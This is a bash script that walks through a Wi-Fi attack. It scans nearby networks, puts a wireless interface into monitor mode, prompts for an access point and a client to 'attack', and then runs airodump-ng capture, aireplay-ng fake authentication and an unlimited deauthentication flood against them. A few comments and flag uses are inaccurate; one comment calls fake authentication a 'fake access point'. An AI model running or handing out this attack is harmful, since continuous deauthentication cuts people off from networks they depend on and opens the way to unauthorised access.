#!/bin/bash



#Check if user is root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit
fi

clear

iwconfig
echo "Enter the interface name"
read interface

clear

# Check if interface is up
ifconfig $interface | grep UP
if [ $? -eq 0 ]
then
    echo "Interface is up"
else
    echo "Interface is down"

    #Finish
    exit
fi



clear

# Check if interface is in managed mode
iwconfig $interface | grep Managed
if [ $? -eq 0 ]
then
    echo "Interface is in managed mode"
else
    echo "Interface is not in managed mode"
    
    # Start monitor mode
    ifconfig $interface down
    iwconfig $interface mode managed
    ifconfig $interface up
    if [ $? -eq 0 ]
    then
        echo "Managed mode started"
    else
        echo "Managed mode failed to start"
        exit
    fi
fi




clear
# Perform a WLAN scan and get the SSID , the MAC address and the channel
iwlist $interface scan | grep -i "ESSID" | cut -d ":" -f 2 | cut -d "\"" -f 2 | sort -u > ssid.txt 
iwlist $interface scan | grep -i "Address" | cut -d ":" -f 2 | cut -d " " -f 2 | sort -u > mac.txt
iwlist $interface scan | grep -i "Channel" | cut -d ":" -f 2 | cut -d " " -f 2 | sort -u > channel.txt
 # print the results to the screen 
echo "SSID"
echo "MAC"
echo "Channel"
echo "--------------------------------------------------" 
paste ssid.txt mac.txt channel.txt | column -t



# Check if interface is in monitor mode
iwconfig $interface | grep Monitor
if [ $? -eq 0 ]
then
    echo "Interface is in monitor mode"
else
    echo "Interface is not in monitor mode"
    
    # Start monitor mode
    ifconfig $interface down
    iwconfig $interface mode monitor
    ifconfig $interface up
    if [ $? -eq 0 ]
    then
        echo "Monitor mode started"
    else
        echo "Monitor mode failed to start"
        exit
    fi
fi



echo "Enter the BSSID of the access point you want to attack"
read assid
clear

# Exit if BSSID is not valid
if [ -z "$assid" ]
then
    echo "BSSID is not valid"
    exit
fi


echo "Enter the channel you want to attack"
read channel


# Exit if channel is not valid
if [ -z "$channel" ]
then
    echo "Channel is not valid"
    exit
fi


# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.





# Scan the channel of the BSSID
echo "Scanning channel $channel"
airodump-ng $interface --bssid $assid --channel $channel



echo "Enter the BSSID you want to attack"
read tarssid


# Exit if BSSID is not valid
if [ -z "$tarssid" ]
then
    echo "BSSID is not valid"
    exit
fi




# Fake an access point with assid as BSSID and channel as channel of the AP
echo "Starting fake access point"
aireplay-ng -1 0 -a $assid -h $tarssid $interface







# Deauthanticate the target
echo "Deauthing target"
aireplay-ng -0 0 -a $assid -h $tarssid $interface

